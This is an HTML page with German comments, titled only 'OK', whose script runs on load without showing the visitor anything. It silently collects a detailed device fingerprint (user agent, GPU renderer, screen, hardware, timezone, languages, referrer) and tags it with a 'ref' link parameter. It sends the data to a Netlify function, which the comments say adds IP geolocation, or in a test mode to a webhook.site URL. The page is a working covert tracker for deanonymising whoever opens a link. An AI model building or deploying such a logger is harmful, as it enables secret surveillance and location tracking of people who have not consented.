<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>OK</title>
  <meta name="robots" content="noindex,nofollow">
</head>
<body>
<script>
/** ====== Ziele ====== */
const ENDPOINT_URL = "https://bespoke-marigold-09826a.netlify.app/.netlify/functions/collect"; // Netlify Function
const DIRECT_WEBHOOK_URL = "https://webhook.site/fc10ea3b-4b75-4725-aa21-3856361748ca";         // dein webhook (nur für Test)

/** ====== Modus aus Query ====== */
const q = new URLSearchParams(location.search);
const REF = q.get("ref") || null;
const DIRECT = q.has("direct"); // ?direct=1 → direkt an webhook + Dummy-Geo

/** ====== Helpers ====== */
function tzOffset(){
  const m=new Date(), off=-m.getTimezoneOffset(), s=off>=0?"+":"-";
  const h=String(Math.floor(Math.abs(off)/60)).padStart(2,"0");
  const mn=String(Math.abs(off)%60).padStart(2,"0");
  return `${s}${h}:${mn}`;
}
function detectOS(ua){
  ua = (ua||"").toLowerCase();
  if(/windows nt/.test(ua)) return "Windows";
  if(/mac os x/.test(ua))  return "macOS";
  if(/android/.test(ua))   return "Android";
  if(/iphone|ipad|ipod|ios/.test(ua)) return "iOS/iPadOS";
  if(/linux/.test(ua))     return "Linux";
  return "Unbekannt";
}

/** ====== Extended Client-Daten ====== */
function collectExtended(){
  const nav = navigator;
  // WebGL (GPU Infos)
  let glInfo=null;
  try{
    const canvas=document.createElement("canvas");
    const gl=canvas.getContext("webgl")||canvas.getContext("experimental-webgl");
    if (gl){
      const dbg=gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg){
        glInfo={ vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) };
      }
    }
  }catch(e){}

  return {
    ref: REF,
    timestamp_iso: new Date().toISOString(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tz_offset: tzOffset(),
    language: nav.language,
    languages: nav.languages,
    doNotTrack: nav.doNotTrack || (window.doNotTrack ?? null),
    cookiesEnabled: nav.cookieEnabled,
    platform: nav.platform,
    userAgent: nav.userAgent,
    os: detectOS(nav.userAgent),
    browser: (function(){
      const ua=(nav.userAgent||"").toLowerCase();
      if (ua.includes("edg/")) return "Edge";
      if (ua.includes("chrome/") && !ua.includes("edg/") && !ua.includes("opr/")) return "Chrome";
      if (ua.includes("safari/") && !ua.includes("chrome/")) return "Safari";
      if (ua.includes("firefox/")) return "Firefox";
      if (ua.includes("opr/")) return "Opera";
      return "Unbekannt";
    })(),
    screen:{ w:screen.width, h:screen.height, pixelRatio:window.devicePixelRatio||1, colorDepth:screen.colorDepth },
    viewport:{ w:window.innerWidth, h:window.innerHeight },
    hardware:{ cores:navigator.hardwareConcurrency??null, ramGB:navigator.deviceMemory??null, maxTouch:navigator.maxTouchPoints??0 },
    storage:{ local: !!window.localStorage, session: !!window.sessionStorage },
    connection: navigator.connection ? { type:navigator.connection.effectiveType, downlink:navigator.connection.downlink } : null,
    gl: glInfo,
    local_time: new Date().toString(),
    page:{ href: location.href, referrer: document.referrer }
  };
}

/** ====== Senden (sendBeacon → fetch Fallback) ====== */
async function send(url, payload){
  try{
    const blob = new Blob([JSON.stringify(payload)], {type:"text/plain;charset=UTF-8"});
    const ok = navigator.sendBeacon(url, blob);
    if (!ok){
      await fetch(url, { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify(payload), keepalive:true });
    }
  }catch(e){ /* stumm */ }
}

/** ====== Start ====== */
document.addEventListener("DOMContentLoaded", async ()=>{
  const base = collectExtended();

  if (DIRECT){
    // Test/Direct-Mode: direkt an webhook + Dummy-Geo dazu, damit du die Struktur im webhook siehst
    const testPayload = {
      received_at_iso: new Date().toISOString(),
      request_ip: "203.0.113.42", // Dummy-IP (TESTNET)
      user_agent: base.userAgent,
      referrer: base.page.referrer || null,
      client: base,
      ip_geolocation: {
        src: "dummy",
        city: "Berlin",
        region: "Berlin",
        country: "DE",
        country_code: "DE",
        org: "Example ISP",
        asn: 64500,
        latitude: 52.52,
        longitude: 13.405,
        timezone: "Europe/Berlin"
      },
      runtime: { platform: "direct-test" }
    };
    await send(DIRECT_WEBHOOK_URL, testPayload);
  } else {
    // Normal: an deine Netlify-Function (die reichert IP/Geo serverseitig an und leitet weiter)
    await send(ENDPOINT_URL, base);
  }
});
</script>
</body>
</html>
